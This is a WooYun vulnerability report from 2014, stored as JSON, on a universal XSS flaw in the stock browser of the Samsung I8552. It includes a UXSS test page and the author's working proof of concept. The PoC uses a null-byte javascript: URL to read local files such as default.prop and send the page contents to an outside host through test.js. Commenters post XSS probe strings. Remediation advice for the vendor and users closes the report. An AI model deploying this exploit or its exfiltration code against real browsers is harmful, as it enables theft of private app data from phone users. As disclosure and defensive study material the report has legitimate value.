{"id": 43953, "wybug_id": "wooyun-2014-081165", "wybug_title": "三星I8552手机自带浏览器存在Uxss引发的一场血案", "wybug_corp": "三星", "wybug_author": "袋鼠爸爸", "wybug_date": "2014-10-30 11:15", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安卓系统版本问题"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-04：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： 昨晚实在太无聊了。。跑去乌云的文章：http://drops.wooyun.org 看了几篇文章。看到了个android uxss的文章随后我就试试手机的firefox浏览器谁知道不行。。接着我就试了下手机自带的浏览器。。OK。。接着。。发生以下的血案 详细说明：  文章社区中有个在线测试是否存在uxss漏洞。这里我也就贴上代码给大家自己测试下呗。。\n<html>    <head>        <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\">        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">        <title>wooyun  uxss测试</title>        <link href=\"http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css\" rel=\"stylesheet\">  \t\t<script src=\"http://libs.baidu.com/jquery/2.0.0/jquery.min.js\"></script>   \t\t<script src=\"http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js\"></script>        <script src=\"/poc.js\"></script>    </head>    <body>        <h2 class=\"text-center\">wooyun  UXSS 测试</h2>        <p>  \t\t\t<center> <button type=\"button\" class=\"btn btn-primary btn-lg\">正在测试</button></center>        </p>        <div class=\"progress progress-striped active\">   <div class=\"progress-bar progress-bar-success\" role=\"progressbar\"       aria-valuenow=\"60\" aria-valuemin=\"0\" aria-valuemax=\"100\"       style=\"width: 0%;\">      <span>0%</span>   </div>\t</div>\t<hr>     <div id=\"testing\">     </div>     <script>                 window.i = 0;\t\t\t         window.total = 6\t\t\t//payload的个数var result_view = function(result_arr){         view_html = \"\";    all_poc_length = 0;    all_poc_html = \"\";    for(i in poc){        all_poc_html += \"<p>\" + poc[i] + \"</p>\";    \tall_poc_length ++;    }    result_arr_length = result_arr.length;    if(result_arr_length == 0){\t//未发现漏洞        view_html = result_view_html.replace(\"<bugpoctitle>\", \"未发现漏洞，详情如下：\")        view_html = view_html.replace(\"<bugpoccontent>\", \"使用总共的\"+all_poc_length+\"个poc测试，未发现漏洞存在\");    }else{\t\t\t//统计漏洞信息        tmp_html = \"\";        for(i = 0; i< result_arr_length; i++){            tmp_html += \"<p>存在漏洞：\" + poc[result_arr[i]] + \"</p>\";        }        view_html = result_view_html.replace(\"<bugpoctitle>\", \"发现了\"+result_arr_length+\"个漏洞，详情如下：\");        view_html = view_html.replace(\"<bugpoccontent>\", tmp_html);    }    view_html = view_html.replace(\"<totoalpoctest>\", all_poc_length);    view_html = view_html.replace(\"<allpoccontent>\", all_poc_html);        result_html  =  $(\"#testing\").html(view_html);    $(\".btn-primary\").text(\"测试完成\");    }                  var result = function(code){\t//返回结果             $.getJSON(\"/get.php?code=\" + code, function(data){         \t\t result_arr = new Array();                 result_html  =  $(\"#testing\").html();                 result_html += \"<p>测试结果:</p>\";                                 if(data.status == true){                 \tresult = data.msg;                     for(i in result){                         if (result[i] == 1){\t//表示存在问题                             //result_html += \"<p>存在\" + i + \"漏洞</p>\";                               result_arr.push(i);                         }                     }                 }                                  result_view(result_arr);                                  for(j=1; j< 11; j++){\t\t//清空一下iframe                 \t $(\"#poc\" + j ).attr(\"src\",\"\");     \t\t\t }             });         }                  var poc_start = function(i, code){                          if(i == 1){             \t$(\"#testing\").html(\"<p>开始测试..............</p>\")             }                          if(i == window.total + 1){                          \t tmp_html = $(\"#testing\").html();                 tmp_html += \"<p>测试完成..................</p>\";                 $(\"#testing\").html(tmp_html);                 clearInterval(window.timer);                 $(\".btn-primary\").text(\"统计结果中.....\");                 setTimeout(\"result(code)\", 3000);\t\t//3秒后取结果                 return;             }                          iframesrc = i + \".php?code=\" + code;             test_html = $(\"#testing\").html();             test_html += \"<p>正在测试 第\"+ i + \"个payload</p>\"             $(\"#testing\").html(test_html);                                 $(\"#poc\" + i ).attr(\"src\",\"/poc/\" + iframesrc)                                 progress = i / window.total;             progress = progress.toFixed(2) * 100 + \"%\";                         $(\".progress-bar\").attr(\"style\", \"width:\" + progress);             $(\".progress-bar\").text(progress);                      }        var start = function(token){             $.getJSON(\"/getcode.php?token=\" + token, function(data){             \t                 if(data.status == true){                                      \tcode = data.code;\t\t\t\t                \twindow.i += 1;                 \tj = window.i             \t\tpoc_start(j, code);                 }else{                 \tclearInterval(window.timer);                    alert(data.msg);                 }             \t             });         }                         $(\".btn-primary\").click(function(){                          //           window.timer = window.setInterval(\"start('8237dac8d0')\", 1000);                                  })             window.timer = window.setInterval(\"start('8237dac8d0')\", 1000);              </script>        <iframe id=\"poc1\" width=0 height=0></iframe>        <iframe id=\"poc2\" width=0 height=0></iframe>        <iframe id=\"poc3\" width=0 height=0></iframe>        <iframe id=\"poc4\" width=0 height=0></iframe>        <iframe id=\"poc5\" width=0 height=0></iframe>        <iframe id=\"poc6\" width=0 height=0></iframe>        <iframe id=\"poc7\" width=0 height=0></iframe>        <iframe id=\"poc8\" width=0 height=0></iframe>        <iframe id=\"poc9\" width=0 height=0></iframe>        <iframe id=\"poc10\" width=0 height=0></iframe>    </body></html>\n这个代码不是我原创的哈。。别喷。。\n\n于是我们收集了一些命中率较高的POC来验证到底哪些app更靠谱一些。    https://code.google.com/p/chromium/issues/detail?id=37383    https://code.google.com/p/chromium/issues/detail?id=90222    https://code.google.com/p/chromium/issues/detail?id=98053    https://code.google.com/p/chromium/issues/detail?id=117550    https://code.google.com/p/chromium/issues/detail?id=143437    https://code.google.com/p/chromium/issues/detail?id=143439你看。。多神的一个话题。。由于我没钱啊。。所以用的手机很菜。。你看街边这么多拿着低版本安卓系统的用户。。随意窃取信息不成问题了。。   漏洞证明：  构造了个窃取本地信息的poctest.html\n<button onclick=\"iframe.src='http://notfound/'\">x</button><br><button onclick=\"exploit1()\">Get local file!</button><br><script>function exploit1() {    window.open('\\u0000javascript:document.body.innerHTML=\"<script/src=http://site/test.js></scr\"+\"ipt><iframe src=file:/default.prop onload=exploit2()  style=width:100%;height:1000px; name=test2></iframe>\";','test');}</script><iframe src=\"http://m.baidu.com/\" id=\"iframe\" style=\"width:100%;height:1000px;\" name=\"test\"></iframe>\n然后再构造个test.js：\nvar flag = 0;function exploit2(){  if(flag) {return} window.open('\\u0000javascript:location.replace(\"http://sectest.sinaapp.com/cross/test.php?test=\"+escape(document.body.innerHTML))','test2');  flag = 1;}\n由于我找不到手机自带浏览器所以看不到这个结果。。不然。。呵呵！相应app私有目录/data/data/packagename/下文件   修复方案：  厂商（仅供参考）：1、服务端禁止iframe嵌套X-FRAME-OPTIONS:DENY。详见：http://drops.wooyun.org/papers/1042、客户端使用setAllowFileAccess(false)方法禁止webview访问本地域。详见：setAllowFileAccess(boolean)3、客户端使用onPageStarted (WebView view, String url, Bitmap favicon)方法在跳转前进行跨域判断。详见[onPageStarted (WebView view, String url, Bitmap favicon)][8]4、客户端对iframe object标签属性进行过滤。用户：1、使用漏洞较少的app，及时更新app。2、不要随意打开一些莫名其妙的链接。3、有钱你就买新手机吧，android L马上出来了。（可以通过google play推送安全补丁,呵呵）0x05 利用（此部分考虑到影响并未第一时间放出，现在漏洞已经被忽略，在此更新）   版权声明：转载请注明来源 袋鼠爸爸@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-30 11:26 |    \t\t袋鼠爸爸 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | \"><img src=x onerror=alert(1);</img>)\t\t \n  厂商错了。。应该是三星电子@Finger 求修改    \n     2014-12-27 00:07 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  <a href=\"javascript:alert('by泳少--AG安全团队')\">by泳少</a>    \n     2014-12-27 00:09 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  <a torget=\"_blank\" href=\"http://www.baidu.com\">WooYun:test</a>    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}